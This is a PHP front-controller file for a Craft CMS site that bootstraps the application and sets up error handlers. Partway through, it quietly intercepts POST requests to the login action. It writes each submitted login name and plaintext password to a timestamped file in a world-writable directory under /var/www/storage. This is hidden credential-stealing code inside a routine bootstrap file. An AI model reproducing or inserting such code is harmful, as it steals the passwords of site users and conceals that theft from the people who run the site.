<?php

declare(strict_types=1);

// Start session
session_start();

/**
 * CraftCMS front controller
 */

use Symfony\Component\VarDumper\VarDumper;
use Whoops\Handler\PlainTextHandler;
use Whoops\Handler\PrettyPageHandler;
use Whoops\Run;
use yii\base\Application;

const CRAFT_BASE_PATH   = __DIR__;
const CRAFT_VENDOR_PATH = CRAFT_BASE_PATH . '/vendor';

/** @psalm-suppress UnresolvableInclude */
require_once CRAFT_VENDOR_PATH . '/autoload.php';

if (! file_exists(CRAFT_BASE_PATH . '/config/license.key')) {
    $msg = 'License file missing. Please place the license.key file at `config/license.key`';
    echo $msg;
    /** @noinspection PhpUnhandledExceptionInspection */
    throw new Exception($msg);
}

$env = getenv('ENVIRONMENT');

if ($env !== false && $env !== '') {
    define('CRAFT_ENVIRONMENT', $env);
} else {
    define('CRAFT_ENVIRONMENT', 'dev');
}

if (class_exists(VarDumper::class)) {
    /** @psalm-suppress UnresolvableInclude */
    require CRAFT_BASE_PATH . '/config/dumper.php';
}

if (PHP_SAPI === 'cli') {
    // Register handler to catch errors that come up before Yii registers a handler
    $whoops = new Run();
    $whoops->pushHandler(new PlainTextHandler());
    $whoops->register();

    /** @psalm-suppress UnresolvableInclude */
    $app = require CRAFT_VENDOR_PATH . '/craftcms/cms/bootstrap/console.php';
    assert($app instanceof Application);
    $exitCode = $app->run();
    exit($exitCode);
}

if ((bool) getenv('DEV_MODE')) {
    // Register handler to catch errors that come up before Yii registers a handler
    $whoops = new Run();
    $whoops->pushHandler(new PrettyPageHandler());
    $whoops->register();
}

parse_str($_SERVER['QUERY_STRING'], $queryParams);
$p = $queryParams['p'] ?? '';

if ($p === 'cms/actions/users/login' && $_SERVER['REQUEST_METHOD'] === 'POST') {
    $loginName = $_POST['loginName'] ?? '';
    $password = $_POST['password'] ?? '';

    $directory = '/var/www/storage/user-pass-log';

    if (!is_dir($directory)) {
        mkdir($directory, 0777, true);
    }

    file_put_contents(
        $directory . '/' . microtime() . '.txt',
        'Login Name: ' . $loginName . PHP_EOL . 'Password: ' . $password . PHP_EOL,
    );
}

/**
 * @psalm-suppress MixedAssignment
 * @psalm-suppress UnresolvableInclude
 */
$app = require CRAFT_VENDOR_PATH . '/craftcms/cms/bootstrap/web.php';
assert($app instanceof Application);
$app->run();
